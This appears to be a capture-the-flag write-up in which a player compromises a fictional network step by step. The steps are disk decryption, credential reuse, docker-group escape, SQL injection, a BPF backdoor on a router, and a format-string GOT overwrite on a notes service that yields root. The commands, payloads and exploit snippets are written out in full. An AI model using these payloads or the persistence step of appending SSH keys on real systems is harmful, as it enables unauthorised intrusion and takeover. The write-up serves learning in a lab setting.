# OPERATION BAD PRIMATE

## Table of Contents

1. [Disk decryption](#1-disk-decryption)
2. [Dockerfile credentials](#2-dockerfile-credentials)
3. [Container exploration](#3-container-exploration)
4. [Privilege escalation](#4-privilege-escalation)
5. [Docker privilege escalation](#5-docker-privilege-escalation)
6. [Host exploration](#6-host-exploration)
7. [Network reconnaissance](#7-network-reconnaissance)
8. [SQL injection](#8-sql-injection)
9. [Router access & BPF backdoor](#9-router-access--bpf-backdoor)
10. [Network reconnaissance & NoteNexus](#10-network-reconnaissance--notenexus)
11. [Full attack chain](#11-full-attack-chain)

---

## 1. Disk decryption

We get a "printserver-sha256-224ca178c5add882ea6d5333e47857114b2b4751a7848d2f1af0336bab4674b8.vmdk", created a vm and attached the vmdk, was prompted password and username, tried the common combinations of root, admin etc. No access.

To continue finding a way in, i attached it to another vm to see disk content and saw it had two images. One was the boot loader and another one was encrypted with LUKS2. Some research indicated that the initrd.img in the boot loader, possibly had the password to decrypt the LUKS2 encryption. The encryption is in most cases not brute forceable, so i assumed there was another way in. I ended up finding a file here.

**initrd.img-decompressed/scripts/local-top/disk**

Here i found a command that could decrypt the drive.

```
echo -n reissue_collision_dropkick_sprung | cryptsetup open -d - /dev/disk/by-uuid/f843a562-5f1f-430f-b14a-05e0de85ae38 disk
```

## 2. Dockerfile credentials

In the now decrypted drive, i found something interesting the Dockerfile at `var\lib\machines\hostcontainer-upper\root\Dockerfile` which contained these lines

**Dockerfile**
```dockerfile
RUN adduser user
RUN sh -c 'echo user:hunter2 | chpasswd'
```

With this information i could gain access using this command `ssh user@127.0.0.1 -p 2222` with password ```hunter2``` (-p 2222 instead of 22 because i port forwarded the vm)

```
ssh user@127.0.0.1 -p 2222

This system is monitored 24/7.
All activity is logged, audited, and reviewed.
If you are not authorized, disconnect immediately.

(user@127.0.0.1) Password:

[α] user@1ee55c34929d:~$
```

## 3. Container exploration

Now inside the docker i looked at the files

```
[α] user@1ee55c34929d:~$ ls -la
total 36
drwx------ 3 user user 4096 Jan 28 11:58 .
drwxr-xr-x 4 root root 4096 Jan 28 11:58 ..
-rw-r--r-- 1 user user  187 Jan 28 11:58 .bash_history
-rw-r--r-- 1 user user  220 Jan 28 11:58 .bash_logout
-rw-r--r-- 1 user user 3626 Jan 28 11:58 .bashrc
-rw-r--r-- 1 user user  807 Jan 28 11:58 .profile
-rw-r--r-- 1 user user  482 Jan 28 11:58 chat.log
drwxr-xr-x 2 user user 4096 Jan 28 11:58 hostconf
-rw-r--r-- 1 user user  311 Jan 28 11:58 network.md
```

The interesting files are chat.log, network.md and .bash_history

**chat.log:**
```
bob: They asked me to look at the bpf service, but I can't access it..
jeff: Are you behind the router?
bob: ...there's a router? What are you talking about?
jeff: You're probably in the wrong part of the network, then.
jeff: Anyway, once you get there, you might need the vxlan vpn thingie I made...
bob: vxlan? I'm not following... can you please explain?
jeff: Yeah, eh, I just gotta get some lunch here..
* jeff has left the chat *
bob: ...damnit jeff
* bob has left the chat *
```

Sounds like we need to get into a router.

**network.md:**
```
# Network diagram
id | subnet           | dhcp        | comments
-- | ---------------- | ----------- | -------------
1  | 192.168.??.??/28 | printserver | wan
41 | 172.17.0.0/24    | docker      | containers
42 | 10.0.42.0/24     | router      | core services
67 | 10.0.67.0/24     | router      | vpn services
```

We're gonna note down these network details. We are missing some subnet information we will come back to this later.

**.bash_history:**
```
docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=172.17.0.1:2376 run --rm -it debian
rm cert.pem key.pem
ssh -p 2222 172.17.0.1
ssh pamela@localhost
su pamela
```

Other users are using the pamela user, which i will try to gain access to.

## 4. Privilege escalation

```
[α] user@1ee55c34929d:~$ su pamela
PASSWORD:
Your password must be at least 10 characters long

^C
[α] user@1ee55c34929d:~$ su pamela
PASSWORD:
Your password must contain an uppercase character
```

It asks for a password and i tried some random but it keeps coming with these cases but in the docker file there was also

**Dockerfile**
```dockerfile
RUN adduser pamela
RUN addgroup --gid 103 docker
RUN adduser pamela docker

ADD tmp/pamela.tar /
RUN /install.sh
RUN rm /install.sh
RUN adduser pamela pwpolicy
```

Searching for pamela in the filesystem gave me a hit on 

`var\lib\machines\hostcontainer-upper\var\lib\docker\fuse-overlayfs\nnynfpuq7rmwg326lydmz521x\diff\tmp\pamela.tar`

Which had install.sh and it contains `chmod 644 /usr/lib/x86_64-linux-gnu/security/pam_pamela.so`. This is the file responsible for the password checking so i opened it in ida and in the function check_password there is a bunch of conditions.

```c
if ( strlen(password) > 9 )
  {
    if ( strlen(password) <= 20 )
    {
      if ( (unsigned int)is_all_ascii(password) )
      {
        if ( (unsigned int)contains_uppercase(password) )
        {
          if ( (unsigned int)contains_lowercase(password) )
          {
            if ( (unsigned int)contains_digit(password) )
            {
              if ( (unsigned int)contains_special(password) )
              {
                if ( (unsigned int)contains_roman(password) )
                {
                  if ( (unsigned int)is_cube((__int64)password) )
                  {
                    if ( (unsigned int)has_letter_streak(password, 5) )
                    {
                      if ( (unsigned int)least_one_bits(password, 60) )
                      {
                        if ( (unsigned int)one_bits_modulo(password, 17) )
                        {
                          if ( (unsigned int)is_palindrome(password) )
                            return 0;
```

Asked ChatGPT to generate a password in this case `4~wowMowo!!owoMwow~4`.

```
[α] user@1ee55c34929d:~$ su pamela
PASSWORD:
[β] pamela@1ee55c34929d:/home/user$
```

We are now pamela.

## 5. Docker privilege escalation

Verified we have access to docker.

```
docker ps
CONTAINER ID   IMAGE        COMMAND               CREATED       STATUS       PORTS                               NAMES
1ee55c34929d   ssh-server   "/usr/sbin/sshd -D"   2 weeks ago   Up 2 hours   0.0.0.0:22->22/tcp, :::22->22/tcp   ssh-server
```

Since pamela is in the docker group we should be able to mount the docker container at /root therefor having root permissions.

```
[β] pamela@1ee55c34929d:/home/user$ docker run -v /:/host -it --rm --entrypoint chroot ssh-server /host bash
[δ] root@hostcontainer:/$
```

## 6. Host exploration

```
[δ] root@hostcontainer:/$ cd /root
[δ] root@hostcontainer:~$ ls -la
total 44
drwxr-xr-x 1 root root 4096 Jan 28 11:58 .
drwxr-xr-x 1 root root 4096 Jan 28 11:49 ..
-rw-r--r-- 1 root root  320 Feb 14 20:29 .bash_history
-rw-r--r-- 1 root root  707 Jan 28 11:57 .bashrc
drwxr-xr-x 3 root root 4096 Jan 28 11:57 .docker
-rw-r--r-- 1 root root  132 Jan  2 12:35 .profile
drwx------ 1 root root 4096 Jan 28 11:57 .ssh
-rw-r--r-- 1 root root  693 Jan 28 11:57 Dockerfile
-rw-r--r-- 1 root root  532 Jan 28 11:57 chat.log
drwxr-xr-x 5 root root 4096 Jan 28 11:58 git
```

The interesting files here are .bash_history and chat.log 

**chat.log:**
```
bob: I figured out what you mean now! I can see the router..
jeff: Huh?
bob: You know - the router you told me about last time?
jeff: Oooh.. no, that was the other jeff. I'm Jeff.
bob: The... other Jeff!? You know what, never mind...
bob: can you just tell me why this freaking company runs so many
bob: services on this one box!?
bob: ...and how do they afford to hire so many consultants?
jeff: Sure thing dude, I just gotta get some lunch first
* jeff has left the chat *
bob: ...
bob: ... DAMNIT JEFF!
* bob has left the chat
```

**.bash_history:**
```
docker exec -w /home/user -u 1000 -it ssh-server bash
python3 ~/git/pwgen/passwdGen.py
bob-tools/test-pwn1 --host router --port 55
curl router -d 'foo'
bob-tools/update-bpf-data --target router:666 --data test1.bpf
rm -rf bob-tools/
nmap -p- router
```

Some hints about router access and bpf.

## 7. Network reconnaissance

```
[δ] root@hostcontainer:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute
       valid_lft forever preferred_lft forever
2: host0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 66:86:2e:47:7c:f7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.102.171/28 metric 1024 brd 192.168.102.175 scope global dynamic host0
       valid_lft 3600sec preferred_lft 3600sec
    inet6 fe80::6486:2eff:fe47:7cf7/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
3: if41@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 4e:a9:d0:48:af:5d brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.42.94/24 metric 1024 brd 10.0.42.255 scope global dynamic if41
       valid_lft 3598sec preferred_lft 3598sec
    inet6 fe80::4ca9:d0ff:fe48:af5d/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:90:6c:84:8e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:90ff:fe6c:848e/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
6: veth3d143ad@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
    link/ether ea:60:bc:a5:4f:3e brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::e860:bcff:fea5:4f3e/64 scope link proto kernel_ll
       valid_lft forever preferred_lft forever
```

192.168.102.171 seems to be the missing .??.?? from `1 | 192.168.??.??/28 | printserver | wan` now i did some scans to see what was up

**Printserver scan:**
```
[δ] root@hostcontainer:~$ nmap 192.168.102.171/28
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 20:34 UTC
Nmap scan report for printserver (192.168.102.161)
Host is up (0.0000080s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2200/tcp open  ici
2222/tcp open  EtherNetIP-1
MAC Address: C6:FB:F6:82:34:9D (Unknown)

Nmap scan report for hostcontainer (192.168.102.171)
Host is up (0.0000080s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
2222/tcp open     EtherNetIP-1

Nmap done: 16 IP addresses (2 hosts up) scanned in 3.28 seconds
```

**Router scan:**
```
[δ] root@hostcontainer:~$ nmap 10.0.42.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 20:34 UTC
Nmap scan report for router (10.0.42.1)
Host is up (0.0000080s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
666/tcp open  doom
MAC Address: 3E:FD:C2:CB:EE:BF (Unknown)

Nmap scan report for 10.0.42.94
Host is up (0.0000080s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   filtered ssh
2222/tcp open     EtherNetIP-1

Nmap done: 256 IP addresses (2 hosts up) scanned in 16.62 seconds
```

So the main server is at 192.168.102.161 (printserver) with ports 22, 80, 2200 and as the chat said there are multiple services running on this one thing

## 8. SQL injection

Curling the printserver we get a login page

```
<!--
    TODO: Check for vulnerabilities before deploying!

    I ran this "Secure Vault" through our security scanner and uh...
    let's just say calling it "secure" is doing some HEAVY lifting!

    This AI-generated masterpiece might have more holes than swiss cheese.
    I counted at least 2 potential vulns before my coffee got cold.

    But sure, ship it to prod on a Friday, what could go wrong?

    - pamela
    P.S. If you're reading this in a breach report... I TOLD YOU SO 😤
-->

<form action="/secrets" method="POST">
```

```
[δ] root@hostcontainer:~$ curl -X POST 192.168.102.161/secrets
```

```html
<p style="color: #ff4444; margin: 20px 0;">sqlite: no rows in result set</p>
```

I applied a random basic sql injection this resulted in the SSH Credentials being shown.

```
[δ] root@hostcontainer:~$ curl -X POST -d "username=admin' OR 1=1--&password=x" 192.168.102.161/secrets
```

```html
<h3>SSH Credentials</h3><pre>Username: user
Password: hunter2</pre>
```

## 9. Router access & BPF backdoor

Now we've also got the router (10.0.42.1) with port 22, 80, 666 (!)

First i tried to check out the web server

```
[δ] root@hostcontainer:~$ curl 10.0.42.1 -v
*   Trying 10.0.42.1:80...
* Connected to 10.0.42.1 (10.0.42.1) port 80
< HTTP/1.1 405 Method Not Allowed
```

GET is not allowed so i tried POST

```
[δ] root@hostcontainer:~$ curl -X POST 10.0.42.1 -v
< HTTP/1.1 400 Bad Request
caas-400991838.go:1:1: expected 'package', found 'EOF'
```

I gave it some go code seeing what would happen, but it just gave me a compiled binary back. Instead i investigated what port 666 did.

To see what is listening on port 666 i needed to login the router luckily for me this backup there is ssh key to router on the decrypted disk at `/var/lib/machines/router-upper/root/.ssh/id_ed25519` in fact there is keys also to root@printserver but these are changed on live so we need to find another way

```
ssh -o StrictHostKeyChecking=no -i /tmp/router_key root@10.0.42.1
[ε] root@router:~#
```

Checked what is listening on port 666.

```
[ε] root@router:~# ss -tulnp | grep :666
tcp   LISTEN 0      10                0.0.0.0:666       0.0.0.0:*    users:(("baby-passes-fil",pid=77,fd=4))
```

I searched for baby-passes-fil and i found the .service file

**var\lib\machines\router-upper\usr\lib\systemd\system\baby-passes-filters.service:**
```ini
[Unit]
Description=evil

[Service]
ExecStart=/usr/bin/baby-passes-filters
User=root

[Install]
WantedBy=multi-user.target
```

The binary baby-passes-filters is a tcp server with a backdoor built in with a bpf filter it's installed via `setsockopt(v46, 1, 0x1A, &optval, 0x10u)` the actual bpf code is at 0x4100 with 374 instructions

I ended up writing a disassembler for it and the code does a couple of checks in the start for example is the port 666 if it's not set the value to failed

```
12: jeq #0x29a, jt 15, jf 13
13: ld #0x1
14: st M[2]
15: ldb [x+26]
```

But now for the main part it does a few xor operations to validate a key

```
21: ldx M[0]
22: ldb [x+21] ; load password[21]
23: st M[1]
24: ldb [x+11] ; load password[11]
25: ldx M[1]
26: xor x ; password[21] ^ password [11]
27: xor #0x1e ; x ^ 0x1e
28: tax
29: ld M[2]
30: or x
31: st M[2]
```

x must be 0x1e for it to pass this check but from this only we can't really bruteforce what password[21] and password[11] should be because others are dependent on these values but while analysing i found this code below

```
274: ldx M[0]
275: ldb [x+14] ; load password[14]
276: xor #0xef ; password[14] ^ 0xef
277: xor #0x83 ; x ^ 0x83
278: tax
279: ld M[2]
280: or x
281: st M[2]
```

0xef ^ 0x83 = 0x6c == 'l' This is enough information to get the rest of the key since we now know 14 is 'l'

So for example

```
77: ldb [x+1] ; load password[1]
78: st M[1]
79: ldb [x+14] ; load password[14]
80: ldx M[1]
81: xor x ; password[1] ^ password[14]
82: xor #0x4 ; x ^ 0x4
```

0x4 ^ password[14] (0x6C) == 0x68 which is 'h' so password[1] is 'h'

Now we can solve the ones that uses password[1] so after extracting the 31 (+1 unique) checks i wrote a script that keeps repeating this and... 

```
python solve_pass.py
channel_oversold_trillion_zoning
```

```
[δ] root@hostcontainer:~$ nc 10.0.42.1 666
channel_oversold_trillion_zoning
whoami
root
```

Now we can add ourselves to authorized_keys so i generated a ssh key

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIA9iSCON8qyfRy+NVVU8j3yBWPLRfwWLQ5BEh5QxJoV admin@Administrator" >> /root/.ssh/authorized_keys
```

```
cat /root/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF8Q3ibVV/eaUprPV6NIIRLaDUdcS920D8tMSfbQcb23 root@router
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIA9iSCON8qyfRy+NVVU8j3yBWPLRfwWLQ5BEh5QxJoV admin@Administrator
```

And we're added to the authorized_keys i tried to connect

```
[δ] root@hostcontainer:~$ ssh -o StrictHostKeyChecking=no -i /tmp/router_key2 root@10.0.42.1
[ε] root@router:~#
```

## 10. Network reconnaissance & NoteNexus

Did a network check

```
[ε] root@router:~# ip a
...
2: vb-router0@if8: inet 10.0.67.1/24 brd 10.0.67.255 scope global vb-router0
3: vb-router1@if9: inet 10.0.42.1/24 brd 10.0.42.255 scope global vb-router1
```

Looks like we got access to `67 | 10.0.67.0/24 | router | vpn services` so i decided to do a scan here

```
[ε] root@router:~# nmap 10.0.67.1/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 21:29 UTC
Nmap scan report for wat (10.0.67.102)
Host is up (0.0000070s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
3000/tcp open  ppp
MAC Address: FE:83:D4:69:D7:80 (Unknown)

Nmap scan report for saas (10.0.67.110)
Host is up (0.0000070s latency).
All 1000 scanned ports on saas (10.0.67.110) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 06:00:52:F6:F8:AB (Unknown)

Nmap scan report for noted (10.0.67.199)
Host is up (0.0000070s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
7000/tcp open  afs3-fileserver
MAC Address: 2E:1C:30:BD:34:7E (Unknown)

Nmap scan report for router (10.0.67.1)
Host is up (0.0000050s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
666/tcp open  doom
```

noted (10.0.67.199 port 7000) seemed to be the most interesting so i decided to look at that one first

```
[ε] root@router:~# nc 10.0.67.199 7000

NoteNexus Pro™

What do you want to do? The choice is yours.
1) List notes
2) Write note
3) Read note
4) Delete note
5) Quit
>
```

Just started poking around tried to write a file with `%1$p %2$p %3$p ...` (up to 20) read the file and it returned

```
Which note would you like to read?
> 1
(nil) (nil) (nil) 0x3 (nil) (nil) (nil) 0x55618010 0x77e611b8 0x555f22a8 0x555f2050 0x77e611a0 0x31 (nil) (nil) (nil) (nil) (nil) (nil) (nil)
```


Now i decided to open it up in ida and look around

```
.text:00000A10 li      $gp, (off_20020+0x7FF0 - .) ; 0x28010
```

```
.text:00001030 sw      $gp, 0x238+var_218($sp)
```

```
.text:00001284 lw      $gp, 0x238+var_218($sp)
.text:00001288 la      $t9, printf
.text:0000128C jalr    $t9  # printf
```

gp gets loaded at offset 0x28010 which looks very familar to 0x55618010 and 0x55618010 - 0x28010 = 0x555f0000 so i assumed this was the base address

```C
case READ_CASE:
    printf("\x1B[0;31mWhich note would you like to read?\n\x1B[0;34m> \x1B[0m");
    file_number = read_first_number(buffer_256);
    if ( file_number >= 0 )
    {
        snprintf(name, 0x100u, "%s/%d", "/tmp/notes", file_number);
        v4 = open64(name, 0, v3);
        v6 = v4;
        if ( v4 < 0 )
        {
            printf("\x1B[0;31mNo such note\n\x1B[0m");
        }
        else
        {
            v7 = lseek64(v4, v5, 0, 0, 2);
            text = (char *)mmap64(0, v7, 1, 1);
            if (text == (char *)-1 )
            {
                puts("Could not map file");
                close(v6);
            }
            else
            {
                close(v6);
                printf(text);
            }
            munmap(text, v7);
        }
    }
    continue;
```

```C
int __fastcall read_first_number(char *nptr)
{
  char *v2; // $s0
  int v3; // $s1

  memset(nptr, 0, 255u);
  if ( read(0, nptr, 1u) > 0 )
  {
    v2 = nptr + 1;
    v3 = 1;
    while ( 1 )
    {
      ++v3;
      if ( read(0, v2, 1u) <= 0 )
        break;
      if ( *v2 == 0xA )
      {
        *v2 = 0;
        return strtol(nptr, 0, 10);
      }
      ++v2;
      if ( v3 == 255 )
        return 0;
    }
  }
  return -1;
}
```

The interesting lines are

```
file_number = read_first_number(buffer_256);
printf(text);
munmap(text, v7); // The goal is to make this system
```

So now i needed a way to redirect the munmap to system but the noted doesn't import it so i can't just .got munmap_ptr = .got system_ptr so we need to find the libc address

The buffer_256 is a reused variable as it is also used for write but it only reads 1 byte so we are able to write more as long as the first is a number


```
What do you want to do? The choice is yours.
1) List notes
2) Write note
3) Read note
4) Delete note
5) Quit
> 3
Which note would you like to read?
> 1AAABBBBCCCCDDDD
(nil) (nil) (nil) 0x3 (nil) (nil) (nil) 0x55618010 0x77e611b8 0x555f22a8 0x555f2050 0x77e611a0 0x41414131 0x42424242 0x43434343 0x44444444 (nil) (nil) (nil) (nil)
```

Now we can see at 13th argument it's our input `1AAA` and it continues

Since we now know from argument 13 is our input i created a script that tried to then read the `.got:000200C4 printf_ptr: .word printf` from noted

Wrote a file with `AA%14$sAA` we can't use argument 13 since 1 byte is used already so we just add some padding and then put in the base + 0x200C4 for the 14th argument (which is the printf ptr) which we then dereference

```
[ε] root@router:~# python3 /tmp/exploit.py
[*] Connected
[*] base = 0x555f0000
[*] printf = 0x77cc37f0
```

We now have the libc printf address so after getting the libc bin and opening it in ida and going to printf export we get `.text:000537F0 printf` now 0x77cc37f0 - 0x537F0 = 0x77C70000 we now have the libc base address so i went and got the system rva `0004EB28 system`

0x77C70000 + 0x4EB28 = 0x77cbeb28 (system address)

Now we need to overwrite the .got munmap_ptr so first we get the rva to it in noted which is `.got:0002006C munmap_ptr: .word munmap`

Now to actually write this address is a little more complex since we can't write the full 4 bytes at once

```python
low = system & 0xFFFF
high = (system >> 16) & 0xFFFF
cmd = "cat /root/.ssh/authorized_keys > /tmp/notes/4;#"

pad1 = high - len(cmd)
pad2 = low - high

payload = cmd
payload += f"%1${pad1}c%15$hn"
payload += f"%2${pad2}c%14$hn"
```

%1${pad1}c%15$hn prints pad1 x amount from %1's value so for example if pad1 is 0x77cb and cmd len is 0x2F then we write 30,714 bytes to memory at %15

And then we do the same for %14 and the other part of the address

After chaining them all together
```
[ε] root@router:~# nano /tmp/exploit.py
[ε] root@router:~# python3 /tmp/exploit.py
[*] Connected
[*] base = 0x555f0000
[*] printf = 0x77cc37f0
[*] libc = 0x77c70000
[*] system = 0x77cbeb28
[*] Payload written
[*] Triggered!
[*] Pwned
[ε] root@router:~# nc 10.0.67.199 7000
What do you want to do? The choice is yours.
1) List notes
2) Write note
3) Read note
4) Delete note
5) Quit
> 3
Which note would you like to read?
> 4
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKhZzUT7lkG2wILqjSz/x8VDWiLnjzuYNQNU0WmQHu45 root@printserver
```

I could now execute commands on the root user

Changed cmd to `echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIA9iSCON8qyfRy+NVVU8j3yBWPLRfwWLQ5BEh5QxJoV admin@Administrator" >> /root/.ssh/authorized_keys;#` and ran it again

Tried to ssh into root@printserver using `ssh -o StrictHostKeyChecking=no -i /tmp/print_key root@192.168.102.161` didn't work but as we saw before there was also port 2200

```
[δ] root@bf01625f4c5d:/$ ssh -o StrictHostKeyChecking=no -i /tmp/pwned_key -p 2200 root@192.168.102.161
[ω] root@printserver:~# ls -la
total 28
drwx------  3 root root 4096 Feb 16 18:21 .
drwxr-xr-x 18 root root 4096 Jan 28 11:50 ..
-rw-------  1 root root   30 Feb 16 21:27 .bash_history
-rw-r--r--  1 root root  709 Jan 28 11:49 .bashrc
-rw-r--r--  1 root root  132 Jan  2 12:35 .profile
drwx------  2 root root 4096 Jan 28 11:49 .ssh
-rw-------  1 root root  863 Jan 28 11:49 2022-Q4-sales.txt
[ω] root@printserver:~# cat 2022-Q4-sales.txt
SALES 2022 Q4

| Product Name                   | Units Sold | Revenue    | Description                                |
|--------------------------------|------------|------------|--------------------------------------------|
| Monkey food, "Orangutan Dream" | 150,000    | $450,000   | Also eaten by non-orangutans               |
| Monkey food, "Chimp's Choice"  | 85,000     | $340,000   | This one really is only for chimps         |
| Bananas, industrial grade      | 40,000     | $120,000   | Gives the whole operation a sense of scale |
| Apples                         | 4,000      | $1,000     | For the monkeys, and the cafeteria.        |
| Oranges                        | 4,000      | $1,000     | Just normal oranges.                       |
| Quantum Warheads               | 17         | $9,824,101 | Don't let the monkeys near these, again.   |
[ω] root@printserver:~#
```

And that was all i did :)

## 11. Full attack chain

HUMINT:
1. Connect to vpn/be internal
2. SQL inject the web app on printserver:80 to get SSH credentials
3. SSH with SSH credentials given from sql injection
4. su pamela with the password `4~wowMowo!!owoMwow~4`
5. Docker escape to host root
6. BPF backdoor on router:666 with `channel_oversold_trillion_zoning`
7. Exploit NoteNexus on noted:7000
8. SSH to printserver on port 2200 as root